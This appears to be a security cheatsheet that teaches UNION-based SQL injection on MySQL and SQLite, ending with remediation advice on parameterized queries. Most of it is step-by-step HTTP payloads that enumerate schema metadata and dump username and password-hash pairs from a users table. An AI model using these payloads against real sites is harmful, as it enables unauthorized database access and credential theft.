---
title: UNION-Based SQL Injection (MySQL vs. SQLite)
tags:
  - security
  - sqli
  - web-security
  - mysql
  - sqlite
  - cheatsheet
created: 2026-11-18
---

# UNION-Based SQL Injection: MySQL vs. SQLite

> [!abstract] Overview
> **SQL Injection (SQLi)** exploits a web application that concatenates unvalidated user input directly into a database query string. In a **In-Band (`UNION`-based)** attack, the attacker appends a `UNION SELECT` statement to extract sensitive database information directly into the rendered HTTP response.

---

## Vulnerable Scenario Setup

Suppose an e-commerce web application loads product details via `https://example.com/item?id=1` and executes the following unsafe query on the backend:

```sql
SELECT id, name, description, price FROM products WHERE id = $id;
```

---

## Quick Comparison: MySQL vs. SQLite

| Feature | MySQL | SQLite |
| :--- | :--- | :--- |
| **Version Function** | `@@version` or `version()` | `sqlite_version()` |
| **Active Database** | `database()` | *N/A (Single-file database)* |
| **Schema Metadata** | `information_schema.tables` & `.columns` | `sqlite_master` (or `sqlite_schema`) |
| **String Concatenation** | `CONCAT(a, b)` | `a \|\| b` |
| **Row Aggregation** | `GROUP_CONCAT(a, ':', b)` | `group_concat(a \|\| ':' \|\| b, ', ')` |
| **Comment Syntax** | `-- -` *(trailing space required)* or `#` | `--` *(no trailing space needed)* or `/* */` |

---

## Shared Discovery Phase (Steps 1 & 2)

Before targeting database-specific metadata, the attacker determines the structure of the original `SELECT` statement.

### Step 1: Find the Number of Columns (`ORDER BY`)
Increment the column index in `ORDER BY n` until the server returns an out-of-bounds error.

* **Payload 1 (Valid - 4 columns exist):**
  ```http
  GET /item?id=1 ORDER BY 4-- -
  ```
* **Payload 2 (Error - confirms 4 columns total):**
  ```http
  GET /item?id=1 ORDER BY 5-- -
  ```
  > [!failure] Database Error
  > `Unknown column '5' in 'order clause'` (MySQL) or `1st ORDER BY term out of range` (SQLite)

### Step 2: Identify Displayed Columns (`UNION SELECT`)
Pass a negative or non-existent ID (`id=-1`) so the original query returns zero rows, forcing the page to render only the injected `UNION SELECT` values.

* **Payload:**
  ```http
  GET /item?id=-1 UNION SELECT 1, 2, 3, 4-- -
  ```
* **Executed SQL:**
  ```sql
  SELECT id, name, description, price FROM products WHERE id = -1 UNION SELECT 1, 2, 3, 4-- -;
  ```
* **Result:** The page displays `2` in the **Product Title** and `3` in the **Product Description**. Columns **2** and **3** are visible outputs.

---

## Track A: MySQL Exploitation Sequence

### Step 3A: Extract Database Version and Schema Name
Replace visible column placeholders (`2` and `3`) with `@@version` and `database()`.

* **Payload:**
  ```http
  GET /item?id=-1 UNION SELECT 1, @@version, database(), 4-- -
  ```
* **Executed SQL:**
  ```sql
  SELECT id, name, description, price FROM products WHERE id = -1 UNION SELECT 1, @@version, database(), 4-- -;
  ```
* **Output:**
  * **Col 2 (Title):** `8.0.35-0ubuntu0.22.04.1`
  * **Col 3 (Description):** `shop_db`

### Step 4A: Enumerate Table Names (`information_schema.tables`)
Query `information_schema.tables` filtered by the current database (`database()`).

* **Payload:**
  ```http
  GET /item?id=-1 UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database()-- -
  ```
* **Executed SQL:**
  ```sql
  SELECT id, name, description, price FROM products WHERE id = -1 UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database()-- -;
  ```
* **Output (Col 2):** `categories,orders,products,users`

### Step 5A: Enumerate Column Names (`information_schema.columns`)
Query `information_schema.columns` for the target table (`users`).

* **Payload:**
  ```http
  GET /item?id=-1 UNION SELECT 1, group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_schema=database() AND table_name='users'-- -
  ```
* **Executed SQL:**
  ```sql
  SELECT id, name, description, price FROM products WHERE id = -1 UNION SELECT 1, group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_schema=database() AND table_name='users'-- -;
  ```
* **Output (Col 2):** `user_id,username,password_hash,email,role`

### Step 6A: Dump Credentials
Concatenate `username` and `password_hash` from the `users` table.

* **Payload:**
  ```http
  GET /item?id=-1 UNION SELECT 1, group_concat(username, ':', password_hash), 3, 4 FROM users-- -
  ```
* **Executed SQL:**
  ```sql
  SELECT id, name, description, price FROM products WHERE id = -1 UNION SELECT 1, group_concat(username, ':', password_hash), 3, 4 FROM users-- -;
  ```
* **Output (Col 2):** `admin:$2y$10$eImiTXuWVxfM37uY4JANjQ==,jdoe:$2y$10$8K1p/a0dL1LXMIgoEDFrwO==`

---

## Track B: SQLite Exploitation Sequence

> [!tip] SQLite `sqlite_master` Shortcut
> SQLite stores the exact `CREATE TABLE` DDL statement in the `sql` column of `sqlite_master` (or `sqlite_schema`). This allows an attacker to extract both **table names** and **column names** in a single query.

### Step 3B: Extract SQLite Version
Replace placeholder `2` with `sqlite_version()`.

* **Payload:**
  ```http
  GET /item?id=-1 UNION SELECT 1, sqlite_version(), 3, 4--
  ```
* **Executed SQL:**
  ```sql
  SELECT id, name, description, price FROM products WHERE id = -1 UNION SELECT 1, sqlite_version(), 3, 4--;
  ```
* **Output (Col 2):** `3.45.1`

### Step 4B: Enumerate Tables and Columns Simultaneously (`sqlite_master`)
Query the `sql` column from `sqlite_master` where `type='table'`.

* **Payload:**
  ```http
  GET /item?id=-1 UNION SELECT 1, group_concat(sql, '; '), 3, 4 FROM sqlite_master WHERE type='table'--
  ```
* **Executed SQL:**
  ```sql
  SELECT id, name, description, price FROM products WHERE id = -1 UNION SELECT 1, group_concat(sql, '; '), 3, 4 FROM sqlite_master WHERE type='table'--;
  ```
* **Output (Col 2):**
  ```sql
  CREATE TABLE products (id INT, name TEXT, description TEXT, price REAL); CREATE TABLE users (user_id INT, username TEXT, password_hash TEXT, role TEXT)
  ```

### Step 5B: Dump Credentials Using `||` Concatenation
In SQLite, `group_concat(expr, sep)` only takes a single expression and a separator. Concatenate columns first with `||`.

* **Payload:**
  ```http
  GET /item?id=-1 UNION SELECT 1, group_concat(username || ':' || password_hash, ', '), 3, 4 FROM users--
  ```
* **Executed SQL:**
  ```sql
  SELECT id, name, description, price FROM products WHERE id = -1 UNION SELECT 1, group_concat(username || ':' || password_hash, ', '), 3, 4 FROM users--;
  ```
* **Output (Col 2):** `admin:$2y$10$eImiTXuWVxfM37uY4JANjQ==, jdoe:$2y$10$8K1p/a0dL1LXMIgoEDFrwO==`

---

## Defence & Remediation

> [!success] Primary Defence: Parameterized Queries (Prepared Statements)
> Parameterized queries separate the SQL code structure from user-supplied data. The database compiles the SQL syntax tree first and binds the input strictly as a literal scalar parameter—making it impossible for injected input to alter query logic.

### Example: PHP (PDO)
```php
// 1. Prepare the SQL template
$stmt = $pdo->prepare('SELECT id, name, description, price FROM products WHERE id = :id');

// 2. Bind user input strictly as a parameter
$stmt->execute(['id' => $_GET['id']]);
$product = $stmt->fetch();
```

### Example: Python (`sqlite3`)
```python
import sqlite3

conn = sqlite3.connect("shop.db")
cursor = conn.cursor()

# Use '?' placeholder and pass input as a tuple
cursor.execute("SELECT id, name, description, price FROM products WHERE id = ?", (user_id,))
product = cursor.fetchone()
```

### Secondary Defences (Defense-in-Depth)
* **Strict Input Validation:** Cast or validate expected types on the application layer (e.g., verifying `id` is strictly an integer before querying).
* **Principle of Least Privilege:** Restrict the database user account so the web application only has `SELECT`, `INSERT`, `UPDATE` permissions on required tables.